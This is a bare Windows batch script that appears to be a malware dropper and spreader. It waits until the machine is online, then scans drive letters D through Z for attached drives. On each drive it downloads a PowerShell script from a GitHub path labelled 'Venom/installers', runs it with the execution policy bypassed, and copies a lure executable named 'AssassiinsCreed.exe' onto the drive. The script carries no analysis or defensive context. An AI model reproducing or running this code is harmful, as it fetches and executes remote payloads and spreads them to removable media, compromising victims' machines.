@echo off

:check_internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 300 >nul
    goto check_internet
)

:check_drive

set timeout_period=30
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        goto Yes
    )
)

timeout /t 300 >nul
goto check_drive

:Yes
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        timeout /t 240 >nul

        powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '%%d:\wYytnosVxfzD.ps1'"

        powershell.exe -ExecutionPolicy Bypass -File "%%d:\wYytnosVxfzD.ps1"

        copy "AssassiinsCreed.exe" "%%d:\AssassiinsCreed.exe"
    )
)

@end
exit
